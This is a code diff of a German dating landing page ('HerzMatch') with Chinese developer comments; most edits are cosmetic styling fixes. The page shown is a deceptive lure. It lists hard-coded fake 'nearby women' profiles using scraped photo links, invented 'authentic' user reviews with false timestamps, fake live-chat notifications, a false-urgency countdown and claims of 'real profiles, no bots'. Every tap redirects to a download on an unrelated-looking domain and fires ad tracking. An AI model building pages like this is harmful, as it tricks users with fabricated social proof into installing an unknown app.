@@ -49,18 +49,22 @@
       box-shadow: 0 8px 30px -4px rgba(244, 63, 94, 0.12);
     }
 
+    /* 修复后的呼吸灯动画：纯阴影呼吸，不占用 transform 轴，确保 active 缩放生效 */
     @keyframes heartbeat-pulse {
       0%, 100% {
-        transform: scale(1);
         box-shadow: 0 6px 20px rgba(244, 63, 94, 0.38);
       }
       50% {
-        transform: scale(1.02);
-        box-shadow: 0 10px 32px rgba(244, 63, 94, 0.65);
+        box-shadow: 0 10px 32px rgba(244, 63, 94, 0.75);
       }
     }
     .cta-heartbeat {
       animation: heartbeat-pulse 1.7s infinite ease-in-out;
+      transition: transform 0.1s ease, filter 0.1s ease;
+    }
+    .cta-heartbeat:active {
+      transform: scale(0.95) !important;
+      filter: brightness(0.92);
     }
 
     @keyframes toast-slide-up {
@@ -74,7 +78,7 @@
     }
   </style>
 </head>
-<body class="flex flex-col min-h-screen pb-32 relative">
+<body ontouchstart="" class="flex flex-col min-h-screen pb-36 relative">
 
   <!-- 浪漫光暈裝飾 -->
   <div class="fixed top-[-80px] right-[-60px] w-72 h-72 rounded-full bg-rose-300/30 blur-3xl pointer-events-none -z-10"></div>
@@ -126,7 +130,7 @@
           </div>
         </div>
       </div>
-      <button onclick="triggerSmartDownload()" class="bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 hover:opacity-95 active:scale-95 transition-all text-white text-xs font-bold px-3.5 py-2.5 rounded-xl shadow-md whitespace-nowrap">
+      <button onclick="triggerSmartDownload()" class="bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 hover:opacity-95 active:scale-95 transition-all text-white text-xs font-bold px-3.5 py-2.5 rounded-xl shadow-md whitespace-nowrap cursor-pointer">
         Jetzt Chatten
       </button>
     </div>
@@ -149,7 +153,7 @@
       </div>
     </div>
 
-    <!-- 4. 您所在地區的女性模組（使用提供的專屬高清頭像1~6，無地域名） -->
+    <!-- 4. 您所在地區的女性模組 -->
     <div onclick="triggerSmartDownload()" class="mt-3.5 bg-gradient-to-r from-rose-400 via-pink-400 to-purple-400 p-[1.5px] rounded-2xl cursor-pointer active:scale-[0.99] transition-all shadow-md shadow-rose-200/50">
       <div class="bg-white/95 backdrop-blur-md rounded-2xl p-3.5">
         <div class="flex items-center justify-between pb-2 border-b border-rose-50">
@@ -164,7 +168,6 @@
           </span>
         </div>
 
-        <!-- 6位附近女性真實頭像 + 名字 -->
         <div class="grid grid-cols-6 gap-2 mt-2.5 text-center">
           <div class="flex flex-col items-center">
             <div class="relative w-11 h-11">
@@ -220,7 +223,7 @@
       </div>
     </div>
 
-    <!-- 5. 女性在線卡片專區（每類目10位，中間帶播放鍵式聊天圖標，點擊即下載回傳） -->
+    <!-- 5. 女性在線卡片專區 -->
     <div class="mt-4">
       <div class="flex items-center justify-between mb-2">
         <h3 class="text-xs font-bold text-slate-900 flex items-center">
@@ -231,17 +234,16 @@
       </div>
 
       <div class="flex space-x-1.5 overflow-x-auto hide-scrollbar pb-1 text-xs" id="categoryTabs">
-        <button onclick="switchCategory('nearby')" data-cat="nearby" class="cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all">In deiner Nähe</button>
-        <button onclick="switchCategory('online')" data-cat="online" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Gerade Aktiv</button>
-        <button onclick="switchCategory('talk')" data-cat="talk" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Jetzt Online</button>
-        <button onclick="switchCategory('video')" data-cat="video" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Direkt-Chat</button>
+        <button onclick="switchCategory('nearby')" data-cat="nearby" class="cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all cursor-pointer">In deiner Nähe</button>
+        <button onclick="switchCategory('online')" data-cat="online" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all cursor-pointer">Gerade Aktiv</button>
+        <button onclick="switchCategory('talk')" data-cat="talk" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all cursor-pointer">Jetzt Online</button>
+        <button onclick="switchCategory('video')" data-cat="video" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all cursor-pointer">Direkt-Chat</button>
       </div>
 
-      <!-- 女性人物卡片列表 -->
       <div id="mediaContainer" class="flex space-x-2.5 overflow-x-auto hide-scrollbar pt-2 pb-1"></div>
     </div>
 
-    <!-- 6. 痛點對比模組（突出純免費、純真人聊天、立即回覆） -->
+    <!-- 6. 痛點對比模組 -->
     <div class="mt-4 glass-heart-card rounded-2xl p-3.5">
       <h3 class="text-xs font-bold text-slate-900 mb-2.5 text-center">Warum Deutsche HerzMatch für echten Chat wählen</h3>
       <div class="space-y-1.5 text-xs">
@@ -301,7 +303,7 @@
       </div>
     </div>
 
-    <!-- 8. 真實用戶獨立評價區（無重複、高真實度真實生活視角） -->
+    <!-- 8. 真實用戶獨立評價區 -->
     <div class="mt-5">
       <div class="flex items-center justify-between mb-2.5">
         <h3 class="text-xs font-bold text-slate-900 flex items-center">
@@ -313,7 +315,7 @@
 
       <div id="reviewsContainer" class="space-y-2 text-xs"></div>
 
-      <button id="loadMoreBtn" onclick="loadMoreReviews()" class="w-full mt-2.5 py-2.5 bg-white/90 hover:bg-white text-rose-700 rounded-xl text-xs font-semibold border border-rose-200 shadow-sm transition-all">
+      <button id="loadMoreBtn" onclick="loadMoreReviews()" class="w-full mt-2.5 py-2.5 bg-white/90 hover:bg-white text-rose-700 rounded-xl text-xs font-semibold border border-rose-200 shadow-sm transition-all cursor-pointer">
         Weitere Berichte laden ▼
       </button>
     </div>
@@ -326,11 +328,11 @@
       </div>
 
       <div class="flex justify-center space-x-3 text-slate-500 font-medium pt-1">
-        <button onclick="openModal('privacyModal')" class="hover:text-rose-600 underline">Datenschutz</button>
+        <button onclick="openModal('privacyModal')" class="hover:text-rose-600 underline cursor-pointer">Datenschutz</button>
         <span>•</span>
-        <button onclick="openModal('termsModal')" class="hover:text-rose-600 underline">Nutzungsbedingungen</button>
+        <button onclick="openModal('termsModal')" class="hover:text-rose-600 underline cursor-pointer">Nutzungsbedingungen</button>
         <span>•</span>
-        <button onclick="openModal('disclaimerModal')" class="hover:text-rose-600 underline">Impressum</button>
+        <button onclick="openModal('disclaimerModal')" class="hover:text-rose-600 underline cursor-pointer">Impressum</button>
       </div>
       <p class="text-center text-[10px] text-slate-400 leading-relaxed px-4">
         © 2026 HerzMatch Media GmbH. Alle Rechte vorbehalten. Streng ab 18 Jahren. Echte Profile mit Ende-zu-Ende-Verschlüsselung.
@@ -339,10 +341,10 @@
 
   </main>
 
-  <!-- 10. 吸底主轉化按鈕 -->
-  <div class="fixed bottom-0 left-0 right-0 p-3 bg-white/90 backdrop-blur-md border-t border-rose-200/60 z-40 shadow-[0_-4px_24px_rgba(244,63,94,0.15)]">
+  <!-- 10. 吸底主轉化按鈕（加高底部 padding 以免被擋） -->
+  <div class="fixed bottom-0 left-0 right-0 p-3 bg-white/95 backdrop-blur-md border-t border-rose-200/60 z-40 shadow-[0_-4px_24px_rgba(244,63,94,0.15)]">
     <div class="max-w-lg mx-auto">
-      <button onclick="triggerSmartDownload()" class="cta-heartbeat w-full bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 active:scale-[0.98] transition-all text-white font-extrabold py-3.5 px-4 rounded-xl shadow-lg flex items-center justify-center space-x-2">
+      <button onclick="triggerSmartDownload()" class="cta-heartbeat w-full bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 text-white font-extrabold py-3.5 px-4 rounded-xl shadow-lg flex items-center justify-center space-x-2 cursor-pointer select-none">
         <svg class="w-5 h-5 text-white fill-current animate-bounce" viewBox="0 0 24 24">
           <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/>
         </svg>
@@ -358,20 +360,20 @@
     </div>
   </div>
 
-  <!-- 11. 實時心動聊天播報浮窗容器 -->
-  <div id="liveActivityToast" class="fixed bottom-24 left-4 z-50 pointer-events-none transition-all duration-300"></div>
+  <!-- 11. 實時心動聊天播報浮窗容器（提升至 bottom-28，完美避開吸底工具列） -->
+  <div id="liveActivityToast" class="fixed bottom-28 left-3 z-30 pointer-events-none transition-all duration-300"></div>
 
   <!-- 法律條款彈窗 -->
   <div id="privacyModal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
     <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
       <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
         <h4 class="text-sm font-bold text-slate-900">Datenschutzerklärung</h4>
-        <button onclick="closeModal('privacyModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+        <button onclick="closeModal('privacyModal')" class="text-slate-400 hover:text-slate-700 text-lg cursor-pointer">✕</button>
       </div>
       <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
         <p>HerzMatch speichert keine Bank- oder Zahlungsdaten. Der Chat ist zu 100% kostenfrei. Standorte dienen ausschließlich zur Berechnung der relativen Distanz.</p>
       </div>
-      <button onclick="closeModal('privacyModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Verstanden</button>
+      <button onclick="closeModal('privacyModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all cursor-pointer">Verstanden</button>
     </div>
   </div>
 
@@ -379,12 +381,12 @@
     <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
       <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
         <h4 class="text-sm font-bold text-slate-900">Nutzungsbedingungen</h4>
-        <button onclick="closeModal('termsModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+        <button onclick="closeModal('termsModal')" class="text-slate-400 hover:text-slate-700 text-lg cursor-pointer">✕</button>
       </div>
       <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
         <p>Nutzung ab 18 Jahren. Echte Profile, respektvoller Umgang beim Chatten. Belästigungen und Fake-Profile werden sofort dauerhaft gesperrt.</p>
       </div>
-      <button onclick="closeModal('termsModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Akzeptieren</button>
+      <button onclick="closeModal('termsModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all cursor-pointer">Akzeptieren</button>
     </div>
   </div>
 
@@ -392,20 +394,17 @@
     <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
       <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
         <h4 class="text-sm font-bold text-slate-900">Impressum</h4>
-        <button onclick="closeModal('disclaimerModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+        <button onclick="closeModal('disclaimerModal')" class="text-slate-400 hover:text-slate-700 text-lg cursor-pointer">✕</button>
       </div>
       <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
         <p>HerzMatch Media GmbH, Berlin, Deutschland. Geprüfte Live-Chat Community für authentische Kommunikation.</p>
       </div>
-      <button onclick="closeModal('disclaimerModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Schließen</button>
+      <button onclick="closeModal('disclaimerModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all cursor-pointer">Schließen</button>
     </div>
   </div>
 
   <script>
-    // 依序精準對應你給予的50張圖片（全部為女性）：
-    // 頂部附近頭像使用前6張，4個分類各使用10張（7~46張），實時播報使用47~50張
     const DATING_PROFILES = [
-      // 1. In deiner Nähe (10 位女性, 圖片索引 7 ~ 16)
       { id: "n1", category: "nearby", name: "Clara", age: "23", job: "Medizinstudentin", tags: ["#AntwortSofort", "#Plaudern"], distance: "1.2 km", img: "https://i.pinimg.com/736x/de/2e/7e/de2e7e1bd2e6d702e923708ffdef3795.jpg" },
       { id: "n2", category: "nearby", name: "Julia", age: "29", job: "Personal Trainerin", tags: ["#OnlineChat", "#Fit"], distance: "2.4 km", img: "https://i.pinimg.com/736x/e4/56/28/e45628e539c55d3d3d239bdfb109130e.jpg" },
       { id: "n3", category: "nearby", name: "Hannah", age: "25", job: "Software-Entwicklerin", tags: ["#KaffeePause", "#Tech"], distance: "3.1 km", img: "https://i.pinimg.com/736x/67/ba/b6/67bab6b64fbc366292fb3a602a061f60.jpg" },
@@ -417,7 +416,6 @@
       { id: "n9", category: "nearby", name: "Vanessa", age: "27", job: "Flugbegleiterin", tags: ["#Reiselust", "#Offen"], distance: "1.5 km", img: "https://i.pinimg.com/736x/e6/74/25/e67425150f0e45d9915c5224bd347d6b.jpg" },
       { id: "n10", category: "nearby", name: "Jessica", age: "24", job: "Tanzlehrerin", tags: ["#Positiv", "#DirektChat"], distance: "2.9 km", img: "https://i.pinimg.com/736x/a7/bd/a7/a7bda7a0793e1dea9141689386f2227f.jpg" },
 
-      // 2. Gerade Aktiv (10 位女性, 圖片索引 17 ~ 26)
       { id: "o1", category: "online", name: "Emilia", age: "24", job: "Biologin", tags: ["#GeradeOnline", "#Natur"], distance: "1.1 km", img: "https://i.pinimg.com/736x/94/d2/d2/94d2d21fbd7750ca14865cd773c3e2eb.jpg" },
       { id: "o2", category: "online", name: "Alina", age: "29", job: "Grafikdesignerin", tags: ["#Design", "#SofortAntwort"], distance: "2.2 km", img: "https://i.pinimg.com/736x/02/30/92/0230922d4dec1a110498d9a3bc45162c.jpg" },
       { id: "o3", category: "online", name: "Nina", age: "26", job: "Apothekerin", tags: ["#Freundlich", "#Chatten"], distance: "900 m", img: "https://i.pinimg.com/736x/0b/66/ed/0b66ed422fe46f4144b4fece3c422e69.jpg" },
@@ -429,7 +427,6 @@
       { id: "o9", category: "online", name: "Klara", age: "22", job: "Musikstudentin", tags: ["#Klavier", "#Entspannt"], distance: "3.0 km", img: "https://i.pinimg.com/736x/73/e2/0a/73e20a5775075d0fe1e12c63bd0b9763.jpg" },
       { id: "o10", category: "online", name: "Marlene", age: "27", job: "Social Media Lead", tags: ["#Online", "#Spontan"], distance: "2.5 km", img: "https://i.pinimg.com/736x/ad/4b/45/ad4b458f11292a0d203997aa6d72ebab.jpg" },
 
-      // 3. Jetzt Online (10 位女性, 圖片索引 27 ~ 36)
       { id: "t1", category: "talk", name: "Stella", age: "26", job: "Schauspielerin", tags: ["#DirektAntwort", "#Ausdruck"], distance: "1.4 km", img: "https://i.pinimg.com/736x/0f/98/78/0f98786f42d05dd15ffd8e17324d4398.jpg" },
       { id: "t2", category: "talk", name: "Jana", age: "25", job: "Übersetzerin", tags: ["#Sprachen", "#Kennenlernen"], distance: "2.0 km", img: "https://i.pinimg.com/1200x/54/77/b6/5477b60d40910413202cf67a2f87cfdf.jpg" },
       { id: "t3", category: "talk", name: "Carla", age: "28", job: "Eventkoordinatorin", tags: ["#Plaudern", "#Offenherzig"], distance: "3.2 km", img: "https://i.pinimg.com/736x/e3/82/3e/e3823e4db5ec94f4b593ec5b66795d30.jpg" },
@@ -441,7 +438,6 @@
       { id: "t9", category: "talk", name: "Selina", age: "25", job: "Optikerin", tags: ["#Detailverliebt", "#Fröhlich"], distance: "2.3 km", img: "https://i.pinimg.com/736x/b7/93/0e/b7930ed648ab472f945dafd2c8dffaca.jpg" },
       { id: "t10", category: "talk", name: "Celine", age: "28", job: "Flight Attendant", tags: ["#Weltoffen", "#ChatReady"], distance: "4.0 km", img: "https://i.pinimg.com/736x/bb/64/b4/bb64b4f848b17c1e8664ae0ee511c06f.jpg" },
 
-      // 4. Direkt-Chat (10 位女性, 圖片索引 37 ~ 46)
       { id: "f1", category: "video", name: "Lorena", age: "24", job: "Fotografin", tags: ["#Kamera", "#LiveChat"], distance: "1.8 km", img: "https://i.pinimg.com/736x/e3/23/38/e3233860cdf129478efd04f1ac57d0c4.jpg" },
       { id: "f2", category: "video", name: "Amelie", age: "27", job: "Sommelière", tags: ["#Genuss", "#DirektOnline"], distance: "2.6 km", img: "https://i.pinimg.com/736x/37/80/e5/3780e53af23c62853d6cfaeeee19e97c.jpg" },
       { id: "f3", category: "video", name: "Victoria", age: "28", job: "Content Creatorin", tags: ["#Storytelling", "#EchtesProfil"], distance: "3.7 km", img: "https://i.pinimg.com/736x/2a/88/26/2a88265c2689f88ec27a075a0995b38c.jpg" },
@@ -457,23 +453,21 @@
     function switchCategory(cat) {
       document.querySelectorAll('.cat-btn').forEach(btn => {
         if(btn.dataset.cat === cat) {
-          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all';
+          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all cursor-pointer';
         } else {
-          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all';
+          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all cursor-pointer';
         }
       });
 
       const container = document.getElementById('mediaContainer');
       const items = DATING_PROFILES.filter(item => item.category === cat);
       
-      // 卡片中間加入「播放鍵風格」的聊天按鈕（Chat Play Icon），點擊直接觸發下載與回傳
       container.innerHTML = items.map(item => `
         <div onclick="triggerSmartDownload()" class="w-36 flex-shrink-0 bg-white rounded-2xl overflow-hidden flex flex-col active:scale-95 transition-all cursor-pointer shadow-md shadow-rose-100 border border-rose-100/80 relative group">
           <div class="h-56 relative overflow-hidden flex flex-col justify-between p-2.5">
             <img src="${item.img}" alt="${item.name}" class="absolute inset-0 w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
             <div class="absolute inset-0 bg-gradient-to-t from-[#4a044e]/90 via-[#831843]/30 to-transparent"></div>
 
-            <!-- 卡片中間帶有「播放鍵風格」的即時聊天按鈕 -->
             <div class="absolute inset-0 flex items-center justify-center z-20 pointer-events-none">
               <div class="w-10 h-10 rounded-full bg-white/80 backdrop-blur-md border border-white/60 flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform">
                 <svg class="w-5 h-5 text-rose-600 fill-current ml-0.5" viewBox="0 0 24 24">
@@ -482,7 +476,6 @@
               </div>
             </div>
 
-            <!-- 頂部在線標識與距離 -->
             <div class="relative z-10 flex items-center justify-between w-full">
               <span class="bg-rose-500/90 backdrop-blur-md text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded-full flex items-center shadow-sm">
                 <span class="w-1.5 h-1.5 rounded-full bg-emerald-300 mr-1 animate-pulse"></span>ONLINE
@@ -492,7 +485,6 @@
               </span>
             </div>
 
-            <!-- 底部人物資訊與標籤 -->
             <div class="relative z-10 w-full text-left">
               <span class="text-white text-sm font-extrabold tracking-tight drop-shadow-sm block">${item.name} · ${item.age}</span>
               <p class="text-pink-100 text-[10px] font-medium leading-tight mt-0.5 truncate">${item.job}</p>
@@ -510,7 +502,6 @@
       `).join('');
     }
 
-    // 實時聊天動態播報（使用圖片索引 47 ~ 50）
     const LIVE_BROADCASTS = [
       { type: "chat", avatar: "https://i.pinimg.com/736x/30/0a/89/300a891e413211a62fd733659427cb90.jpg", title: "Sophie (25)", desc: "hat eine neue Chat-Nachricht gesendet 💬" },
       { type: "connect", avatar: "https://i.pinimg.com/1200x/e4/b9/01/e4b901b19c59450e7f8f3d83d7b79de6.jpg", title: "Lina & Tobias", desc: "haben gerade ein privates Chatfenster geöffnet ✉️" },
@@ -549,7 +540,6 @@
       }, 3600);
     }
 
-    // 獨一無二的真實用戶評價（獨立真實生活故事，無重複）
     const AUTHENTIC_REVIEWS = [
       { name: "Max W.", city: "Berlin", device: "Samsung Galaxy S24", rating: "★★★★★", time: "Vor 12 Minuten", text: "Endlich eine App, bei der man nicht für jede Nachricht Geld bezahlen muss. Habe gestern mit Clara geschrieben – nach 2 Minuten kam direkt eine ausführliche Sprachnachricht zurück. Super sympathische Community!" },
       { name: "Julian K.", city: "München", device: "iPhone 15 Pro", rating: "★★★★★", time: "Vor 35 Minuten", text: "Die Benutzeroberfläche ist extrem flüssig und die Frauen hier antworten wirklich sofort. Man merkt sofort, dass hier keine Bots am Werk sind, sondern echte Menschen, die gerne quatschen." },
@@ -595,7 +585,6 @@
       renderReviews(4);
     }
 
-    // 觸發下載與 Meta 像素回傳
     const DOWNLOAD_URL = "https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks";
 
     function triggerSmartDownload() {
@@ -608,7 +597,6 @@
       window.location.href = DOWNLOAD_URL;
     }
 
-    // 倒計時器
     function startCountdown() {
       let duration = 14 * 60 + 59;
       const display = document.getElementById('countdown');
@@ -622,7 +610,6 @@
       }, 1000);
     }
 
-    // 彈窗開關
     function openModal(modalId) {
       document.getElementById(modalId).classList.remove('hidden');
     }
@@ -630,7 +617,6 @@
       document.getElementById(modalId).classList.add('hidden');
     }
 
-    // 頁面初始化
     window.addEventListener('DOMContentLoaded', () => {
       switchCategory('nearby');
       renderReviews(4);
